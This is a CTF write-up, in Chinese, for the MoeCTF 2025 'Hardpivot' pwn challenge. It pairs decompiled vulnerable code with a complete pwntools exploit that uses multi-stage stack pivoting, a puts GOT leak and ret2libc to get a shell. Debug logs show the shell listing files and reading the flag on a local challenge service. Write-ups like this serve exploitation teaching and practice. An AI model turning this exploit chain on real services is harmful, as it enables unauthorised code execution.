---
title: 'XiDianCTF MoeCTF 2025 PWN Hardpivot'
date: '2026-09-21T11:11:20+08:00'
lastmod: '2026-09-21T11:11:20+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=940)



反编译`pwn`:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  vuln();
  puts("See you again!");
  return 0;
}
```

```c
ssize_t vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("This time I will not give you any gifts again.");
  puts("A single stack pivot doesn鈥檛 seem enough to solve the problem.");
  puts("Think back to what you learned from the previous challenges and integrate it comprehensively.");
  puts("You have made it this far鈥攌eep going, victory is not far away.");
  printf("> ");
  return read(0, buf, 0x50uLL);
}
```

```assembly
text:0000000000401196
.text:0000000000401196 ; Attributes: bp-based frame
.text:0000000000401196
.text:0000000000401196 ; void magic()
.text:0000000000401196                 public magic
.text:0000000000401196 magic           proc near
.text:0000000000401196 ; __unwind {
.text:0000000000401196                 endbr64
.text:000000000040119A                 push    rbp
.text:000000000040119B                 mov     rbp, rsp
.text:000000000040119E                 pop     rdi
.text:000000000040119F                 retn
.text:000000000040119F magic           endp
.text:000000000040119F
.text:000000000040119F ; ---------------------------------------------------------------------------
.text:00000000004011A0                 db 90h
.text:00000000004011A1 ; ---------------------------------------------------------------------------
.text:00000000004011A1                 pop     rbp
.text:00000000004011A2                 retn
.text:00000000004011A2 ; } // starts at 401196
```

注意到`0x50 - 64 = 16 = 8 + 8`，一次栈溢出只能覆写`$rbp`和函数返回地址。

并且根据题目提示:

>   puts("See you again!");

可以知道需要多次栈迁移，并且我们还需要泄露`libc.so.6`。

> 注意: `printf()`会申请一个较大的栈帧，但我们没有足够大的空间，这里需要跳过`printf()`。



exp:

```python	
from pwn import *
import ctypes
import shutil
import logging

pwndbg = shutil.which("pwndbg")
context(arch='amd64', os='linux', log_level='debug')
io = connect("127.0.0.1", 16884)

bssAdd = 0x4040A0
bufOff = 0x800

poprdiAdd = 0x40119e
retAdd = 0x40119f

putGotAdd = 0x404018
putPltAdd = 0x401070
readAdd = 0x401264
leaveAdd = 0x40127b
vulnAdd = 0x401250

io.recvuntil(b'> ')
io.send(b'A' * 64 + p64(bssAdd + bufOff) + p64(readAdd))


io.send(p64(bssAdd+ bufOff) + p64(poprdiAdd) + p64(putGotAdd) + p64(putPltAdd) + p64(readAdd) + b'A' * 0x18 + p64(bssAdd + bufOff - 0x40) + p64(leaveAdd))
putAdd = io.recvuntil(b'\n')[:-1]
print(putAdd)
putAdd = u64(putAdd.ljust(8, b'\x00'))
print("printfAdd:", hex(putAdd))

libcAdd = putAdd - 0x80e50 
systemAdd = libcAdd + 0x50d70
shAdd = libcAdd + 0x1d8678


io.send(p64(bssAdd+ bufOff) + b'A' * 0x18 + p64(poprdiAdd) + p64(shAdd) + p64(systemAdd) + p64(bssAdd + bufOff - 0x40) + p64(leaveAdd))
#也是很巧妙的恰好64位的栈空间

io.interactive()
```

输出:

```
[x] Opening connection to 127.0.0.1 on port 16884
[x] Opening connection to 127.0.0.1 on port 16884: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 16884: Done
[DEBUG] Received 0x111 bytes:
    00000000  54 68 69 73  20 74 69 6d  65 20 49 20  77 69 6c 6c  │This│ tim│e I │will│
    00000010  20 6e 6f 74  20 67 69 76  65 20 79 6f  75 20 61 6e  │ not│ giv│e yo│u an│
    00000020  79 20 67 69  66 74 73 20  61 67 61 69  6e 2e 0a 41  │y gi│fts │agai│n.·A│
    00000030  20 73 69 6e  67 6c 65 20  73 74 61 63  6b 20 70 69  │ sin│gle │stac│k pi│
    00000040  76 6f 74 20  64 6f 65 73  6e e2 80 99  74 20 73 65  │vot │does│n···│t se│
    00000050  65 6d 20 65  6e 6f 75 67  68 20 74 6f  20 73 6f 6c  │em e│noug│h to│ sol│
    00000060  76 65 20 74  68 65 20 70  72 6f 62 6c  65 6d 2e 0a  │ve t│he p│robl│em.·│
    00000070  54 68 69 6e  6b 20 62 61  63 6b 20 74  6f 20 77 68  │Thin│k ba│ck t│o wh│
    00000080  61 74 20 79  6f 75 20 6c  65 61 72 6e  65 64 20 66  │at y│ou l│earn│ed f│
    00000090  72 6f 6d 20  74 68 65 20  70 72 65 76  69 6f 75 73  │rom │the │prev│ious│
    000000a0  20 63 68 61  6c 6c 65 6e  67 65 73 20  61 6e 64 20  │ cha│llen│ges │and │
    000000b0  69 6e 74 65  67 72 61 74  65 20 69 74  20 63 6f 6d  │inte│grat│e it│ com│
    000000c0  70 72 65 68  65 6e 73 69  76 65 6c 79  2e 0a 59 6f  │preh│ensi│vely│.·Yo│
    000000d0  75 20 68 61  76 65 20 6d  61 64 65 20  69 74 20 74  │u ha│ve m│ade │it t│
    000000e0  68 69 73 20  66 61 72 e2  80 94 6b 65  65 70 20 67  │his │far·│··ke│ep g│
    000000f0  6f 69 6e 67  2c 20 76 69  63 74 6f 72  79 20 69 73  │oing│, vi│ctor│y is│
    00000100  20 6e 6f 74  20 66 61 72  20 61 77 61  79 2e 0a 3e  │ not│ far│ awa│y.·>│
    00000110  20                                                  │ │
    00000111
[DEBUG] Sent 0x50 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  a0 48 40 00  00 00 00 00  64 12 40 00  00 00 00 00  │·H@·│····│d·@·│····│
    00000050
[DEBUG] Sent 0x50 bytes:
    00000000  a0 48 40 00  00 00 00 00  9e 11 40 00  00 00 00 00  │·H@·│····│··@·│····│
    00000010  18 40 40 00  00 00 00 00  70 10 40 00  00 00 00 00  │·@@·│····│p·@·│····│
    00000020  64 12 40 00  00 00 00 00  41 41 41 41  41 41 41 41  │d·@·│····│AAAA│AAAA│
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000040  60 48 40 00  00 00 00 00  7b 12 40 00  00 00 00 00  │`H@·│····│{·@·│····│
    00000050
[DEBUG] Received 0x6 bytes:
    00000000  50 ce c6 21  7b 7f                                  │P··!│{·│
    00000006
[DEBUG] Received 0x1 bytes:
    b'\n'
b'P\xce\xc6!{\x7f'
printfAdd: 0x7f7b21c6ce50
[DEBUG] Sent 0x48 bytes:
    00000000  a0 48 40 00  00 00 00 00  41 41 41 41  41 41 41 41  │·H@·│····│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000020  9e 11 40 00  00 00 00 00  78 46 dc 21  7b 7f 00 00  │··@·│····│xF·!│{···│
    00000030  70 cd c3 21  7b 7f 00 00  60 48 40 00  00 00 00 00  │p··!│{···│`H@·│····│
    00000040  7b 12 40 00  00 00 00 00                            │{·@·│····│
    00000048
[*] Switching to interactive mode
$ ls
[DEBUG] Sent ...
[DEBUG] Received ...
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
$ cat flag
[DEBUG] Sent ...
[DEBUG] Received ...
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 16884
```



